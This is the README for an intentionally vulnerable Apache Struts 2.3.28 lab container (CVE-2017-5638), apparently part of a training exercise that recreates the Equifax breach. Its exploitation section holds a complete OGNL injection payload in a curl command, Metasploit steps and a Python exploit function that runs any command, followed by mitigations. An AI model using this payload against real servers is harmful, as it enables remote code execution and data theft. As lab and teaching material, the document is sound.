# Vulnerable Apache Struts 2.3.28 - CVE-2017-5638

**FOR EDUCATIONAL PURPOSES ONLY - TIME BREACH MISSION**

## Overview

This Docker container recreates the vulnerable Apache Struts 2.3.28 environment that was exploited in the 2017 Equifax breach. It demonstrates CVE-2017-5638, a critical remote code execution vulnerability in the Jakarta Multipart parser.

## Vulnerability Details

- **CVE**: CVE-2017-5638
- **Severity**: CRITICAL (CVSS 10.0)
- **Affected Versions**: Struts 2.3.5 - 2.3.31, Struts 2.5 - 2.5.10
- **Attack Vector**: Malicious Content-Type header in multipart/form-data requests
- **Impact**: Remote Code Execution (RCE)

## Historical Context

On March 7, 2017, Apache released patches for this vulnerability. Equifax was notified but failed to patch their ACIS dispute portal. Attackers exploited this from May 13 to July 29, 2017, stealing 147 million consumer records.

## Running the Container

### Build

```bash
cd vulnerable-services/struts2-vulnerable
docker build -t devsecops-struts2-vuln:2.3.28 .
```

### Run

```bash
docker run -d \
  --name struts2-vuln \
  -p 8003:8080 \
  devsecops-struts2-vuln:2.3.28
```

Access at: http://localhost:8003

### Docker Compose Integration

Add to `docker-compose.yml`:

```yaml
  struts2-vulnerable:
    build: ./vulnerable-services/struts2-vulnerable
    container_name: struts2-vuln
    ports:
      - "8003:8080"
    networks:
      - devsecops-net
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/"]
      interval: 30s
      timeout: 5s
      retries: 3
```

## Exploitation

### Manual Exploitation

```bash
# Simple command execution (whoami)
curl -X POST http://localhost:8003/upload.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -F "upload=@/dev/null"
```

### Using Metasploit

```bash
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS localhost
set RPORT 8003
set TARGETURI /upload.action
exploit
```

### Python Exploit Script

```python
import requests

def exploit(target_url, cmd):
    payload = f"%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"

    headers = {'Content-Type': payload}
    files = {'upload': ('test.txt', 'test')}

    response = requests.post(target_url, headers=headers, files=files)
    return response.text

# Usage
result = exploit('http://localhost:8003/upload.action', 'id')
print(result)
```

## Mission Integration

This container is used in the TIME BREACH Equifax mission:

1. **Objective 1**: Research the vulnerability (CVE-2017-5638)
2. **Objective 2**: Identify the vulnerable endpoint (`/upload.action`)
3. **Objective 3**: Craft OGNL injection payload
4. **Objective 4**: Upload webshell for persistence
5. **Objective 5**: Lateral movement (simulated)
6. **Objective 6**: Data exfiltration (simulated)

## Validation Endpoint

The TIME BREACH backend validates exploitation via:

```
POST /api/time-breach/equifax/exploit
{
  "payload": "your_ognl_payload_here",
  "command": "whoami"
}
```

Expected response:
```json
{
  "exploited": true,
  "output": "root",
  "technique": "T1190"
}
```

## Security Warnings

⚠️ **NEVER EXPOSE THIS CONTAINER TO THE INTERNET**

- This is an intentionally vulnerable environment
- Use only in isolated lab networks
- Do not use in production or staging environments
- Do not deploy on cloud platforms without proper network isolation
- Firewall rules should restrict access to localhost only

## Defensive Measures (Education)

How this attack could have been prevented:

1. **Patching**: Upgrade to Struts 2.3.32 or 2.5.10.1 (available March 7, 2017)
2. **WAF Rules**: Block Content-Type headers containing OGNL expressions (`#cmd`, `#_memberAccess`)
3. **Input Validation**: Whitelist valid Content-Type values
4. **Network Segmentation**: Isolate web servers from database servers
5. **Monitoring**: Alert on outbound connections from web/app servers
6. **File Integrity Monitoring**: Detect webshell uploads

## MITRE ATT&CK Mapping

- **T1190**: Exploit Public-Facing Application (Initial Access)
- **T1505.003**: Web Shell (Persistence)
- **T1059**: Command and Scripting Interpreter (Execution)

## References

- [Apache Security Bulletin S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
- [CVE-2017-5638 Details](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [Equifax Breach Report (US House)](https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf)
- [DOJ Indictment of Chinese Hackers](https://www.justice.gov/opa/pr/chinese-military-personnel-charged-computer-fraud-economic-espionage-and-wire-fraud-hacking)

## License

Educational use only. Not for production deployment.
